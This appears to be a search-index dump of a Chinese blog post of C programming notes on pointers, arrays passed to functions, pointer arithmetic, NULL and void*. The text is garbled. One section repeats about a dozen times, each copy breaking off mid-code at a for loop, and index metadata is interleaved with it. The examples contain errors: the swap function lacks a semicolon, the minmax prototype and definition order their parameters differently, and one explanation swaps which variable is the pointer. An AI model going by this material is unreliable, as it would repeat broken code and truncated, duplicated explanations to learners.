寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#交换两个变量的值"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#寻找数组中最大值和最小值"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针常见的错误"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#传入函数的数组"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组名作为函数的参数"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组变量是特殊的指针"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针数组和地址间的关系"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#通过指针实现数组求和"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#通过指针计算数组元素个数和数组元素的储存单元数"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针是const"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#const数组"},{"categories":["Programing"],"content":"\r9.1指针\r运算符\u0026 scanf(\"%d\",\u0026i); 获得变量地址，只能对变量取地址 输出地址 printf(\"%p\\n\",\u0026i); 指针 int* p = \u0026i; 表示内存地址的变量 星号可以靠近p也可以靠近int，但 int* p,q; *p是一个指针变量，而q是普通变量 指针定义 int *p; //定义一个指针变量p,指向整型变量 char *cp; //定义一个指针变量cp，指向字符型变量 float *fp; double *dp1，*dp2; //定义多个指针时，每个变量名前都要加上* 不同的类型名代表该指针所指向的内存空间上所存放的数据的类型 作为参数的指针 void f(int *p); 在被调用的时候得到了某个变量的地址： int i = 0; f(\u0026i); 访问地址上的变量**(指针声明符)是一个单目运算符(运算的优先级较高)，用来访问指针的值所表示的地址上的变量 指针应用\r交换两个变量的值 void swap(int *pa,int *pb) { int t = *pa; *pa = *pb *pb = t; } 寻找数组中最大值和最小值 #include void minmax(int a[], int len, int* max, int* min); int main() { int a[] = { 1,2,3,4,5,6,7,8,9,0,33,55 }; int min, max; minmax(a, sizeof(a) / sizeof(a[0]), \u0026min, \u0026max); printf(\"min=%d,max=%d\\n\", min, max); return 0; } void minmax(int a[], int len, int* min, int* max) { int i; *min = *max = a[0]; for (i = 1; i \u003c len; ++i) { if (a[i] \u003c *min) { *min = a[i]; } if (a[i] \u003e *max) { *max = a[i]; } } } 指针常见的错误定义了指针变量，还没有指向任何变量，就开始使用指针 另外，++*p、(*p)++都是将指针p所指向的变量值加1，而表达式*p++等价于*(p++)随后p不再指向变量a 传入函数的数组函数表中的数组实际上是指针 sizeof(a)==sizeof(int*) 但是可以用数组的运算符[]进行运算 数组名作为函数的参数数组的形参a实际上是一个指针，进行参数传递时，主函数传递的是数组a的基地址，数组元素本身不被复制。 int sum(int a[ ],int n){ int i,s =0; for(i=0;i","date":"2023-11-17","objectID":"/c_language_notes/:9:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#保护数组值"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#92指针运算"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针计算"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#p"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 这并没有改变p所指的变量的类型，而是让后人用不同的眼光通过p看他所指的变量 用指针来做什么 需要传入较大的数据用作参数 传入数组后对数组做操作 函数返回不止一个结果 需要用函数来修改不止一个变量 动态申请的内存…. ","date":"2023-11-17","objectID":"/c_language_notes/:9:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#指针比较"},{"categories":["Programing"],"content":"\r9.2指针运算指针地址+1实际上是加一个sizeof() 给一个指针加1表示要让指针指向下一个变量 int a[10] ; int *p = a ; *(p+1) ---\u003e a[1] 如果指针不是指向一片连续分配的空间(如数组)，则这种运算没有意义 指针计算这些算术运算可以对指针做： 给指针加减一个整数 递增递减(++/–) 两个指针相减 指针减法的含义是，表示两个指针之间含有几个sizeof() *p++ 取出p所指的那个数据，之后把p移动到下一个位置去 *优先级比++低 常用于数组类的连续空间操作 在某些CPU上，这可以直接被翻译成一条汇编指令 指针比较\u003c,\u003c=,==,\u003e,\u003e=,!=都可以对指针做 比较它们在内存中的地址 数组中的单元的地址肯定是线性递增的 0地址0地址通常是不能随便碰的地址 可以用0地址来表示特殊的事情 返回的指针是无效的 指针没有被真正初始化 NULL是一个预定定义的符号，表示0地址 有的编译器不希望用0表示0地址 指针的类型无论指向什么类型，所有的指针大小都是一样的(因为都是地址) 但是指向不同类型的指针是不能直接互相赋值的(为了避免用错指针) 指针的类型转换void* 表示不知道只想什么东西的指针 计算时与char*相同(但不相通) 指针也可以转换类型 int *p = \u0026i ; void *q = (void*)p ; 